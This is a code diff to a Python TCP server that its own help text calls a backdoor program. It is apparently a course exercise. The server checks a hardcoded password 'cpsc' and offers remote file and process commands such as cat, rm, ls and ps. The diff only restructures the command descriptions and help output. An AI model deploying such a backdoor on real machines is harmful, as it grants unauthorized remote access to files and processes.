@@ -6,9 +6,25 @@ class MyTCPHandler(socketserver.BaseRequestHandler):
    
    BUFFER_SIZE = 4096
    def handle(self):
-       commands = ["pwd", "cd", "ls", "cp", "mv", "rm", "cat", "snap", "diff", "help", "logout", "off", "ps", "who"]
-       descriptions = ["return the current working directory", "change the current working directory to <dir>", "list the contents of the current working directory", "copy file1 to file2", "rename file1 to file2", "delete file"]
+
+       descriptions = {}
+       descriptions["pwd"] = 'pwd - return the current working directory'
+       descriptions["cd"] = 'cd <dir> - change the current working directory to <dir>'
+       descriptions["ls"] = 'ls - list the contents of the current working directory'
+       descriptions["cp"] = 'cp <file1> <file2> - copy file1 to file2'
+       descriptions["mv"] = 'mv <file1> <file2> - rename file1 to file2'
+       descriptions["rm"] = 'rm <file> - delete file'
+       descriptions["cat"] = 'cat <file> - return contents of the file'
+       descriptions["snap"] = 'snap - take a snapshot of all the files in the current directory and save it in memory'
+       descriptions["diff"] = 'diff - compare the contents of the current directory to the saved snapshot, and report differences (deleted files, new files and changed files)'
+       descriptions["help"] = 'help [cmd] - print a list of commands, and if given an argument, print more detailed help for the command'
+       descriptions["logout"] = 'logout - disconnect client'
+       descriptions["off"] = 'off - terminate the backdoor program'
+       descriptions["ps"] = 'show currently running processes'
+       descriptions["who"] = 'list user[s] currently logged in'
+
        password = "cpsc"
+
        intro = self.request.sendall(bytearray("Identify yourself!\n", "utf-8"))
        
        passed = False;
@@ -101,9 +117,13 @@ class MyTCPHandler(socketserver.BaseRequestHandler):
                 # help [cmd]
                if data.split(None, 1)[0] == "help":
                   self.request.sendall(bytearray("supported commands:\n", "utf-8"))
-                  for cmd in commands:
+                  for cmd in descriptions.keys():
                     self.request.sendall(bytearray(cmd + "\n", "utf-8"))
                   continue
+
+
+               
+                 
 
                 # off
                if data.split(None, 1)[0] == "off":
